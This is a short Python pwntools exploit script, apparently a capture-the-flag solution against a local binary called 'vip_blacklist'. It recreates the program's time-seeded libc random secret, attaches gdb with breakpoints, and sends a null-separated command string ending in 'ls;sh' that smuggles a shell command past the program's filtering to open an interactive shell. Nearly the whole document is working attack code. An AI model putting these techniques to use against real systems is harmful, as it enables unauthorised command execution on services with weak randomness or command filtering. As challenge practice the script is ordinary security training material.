import ctypes
import time
from pwn import *

RAND_SIZE = 10

r = process("./vip_blacklist")

libc = ctypes.CDLL(None) # Load the C standard library

libc.srand(int(time.time()))  # Seed the random number generator

secret = []
for i in range(RAND_SIZE):
    secret.append(libc.rand() % 256)  # Generate random bytes as the application do

# secret = int.from_bytes(bytes(secret)[::-1], byteorder='little', signed=False)

# print("Secret:", hex(secret))
r.recv()
gdb.attach(r,"""
b *handle_client +176
b * allowCopy + 426
b *safety
c
""")
r.sendline(bytes(secret))
r.recv()
r.send("queue\0clear\0exit\0\0ls;sh\0")
r.interactive()
# print("Secret:", secret)

# print("Secret bytes:", bytes(secret), bytes(secret).hex(), hex() )